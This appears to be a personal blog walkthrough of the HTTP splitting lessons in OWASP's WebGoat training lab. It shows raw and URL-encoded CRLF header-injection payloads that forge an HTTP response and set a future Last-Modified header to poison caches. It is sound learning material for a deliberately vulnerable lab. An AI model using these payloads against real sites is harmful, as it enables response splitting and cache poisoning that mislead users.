---
title: "OWASP Broken Web Applications - WebGoat Walkthrough (Part 1)"
date: 2020-01-21
categories:
  - OWASP-BWA
tags:
  - Beginner
  - Web-Pentesting
---

After watching @NahamSec (Ben Sadeghipour) twitch interview with @Jhaddix (Jason Haddix), both legendary people in the bugbounty scene today, where Jason Haddix shared about some 'crash course' he make his mentees go through to learn about web pentesting: [OWASP Broken Web Application](https://owasp.org/www-project-broken-web-applications/). 

I immediately embarked on this training myself, its free and anyone can download it. Use VMWare/Virtualbox with it and recommended to configure it to host-only network settings (its vulnerable webapps and shouldn't be exposed to public unless you like to invite hackers in!)

I attempt to do a write up of my 


## 1. HTTP SPLITTING

(part 1)
Using [urlencoder](https://www.urlencoder.org/) under 'destination newline seperator' select 'Unix'
```
language=en
Content-Length: 0

HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 10
<html>Test</html>
```

turns to
```
language%3Den%0AContent-Length%3A%200%0A%0AHTTP%2F1.1%20200%20OK%0AContent-Type%3A%20text%2Fhtml%0AContent-Length%3A%2010%0A%3Chtml%3ETest%3C%2Fhtml%3E%0A%0A
```

Note: 
But you will notice that using the `%0a` works while `%0a%0d` doesn't. This is due to the underlying os environment that the application is running on: windows uses two characters for the [CR][LF] sequence, while unix only uses [LF].


| Environment  | CRLF Used  | encoded |
| ------------ |----------- | ------- |
| Windows      | CRLF 	    | %0d%0a  |
| Unix         | LF 	    | %0a     |

https://stackoverflow.com/questions/1552749/difference-between-cr-lf-lf-and-cr-line-break-types

CRLF / HTTP header injection
https://owasp.org/www-community/attacks/HTTP_Response_Splitting
https://portswigger.net/kb/issues/00200200_http-response-header-injection

log poisoning using CRLF
https://www.netsparker.com/blog/web-security/crlf-http-header/


(part 2)
Note: inject the 'Last-Modified' date to a future date which forces the browser to send an If-Modified-Since request header to future requests
*encode uri for below*
```
language=en
Content-Length: 0

HTTP/1.1 200 OK
Content-Type: text/html
Last-Modified: Fri, 1 Jan 2030 00:00:00 GMT
Content-Length: 4
<html>Test</html>

```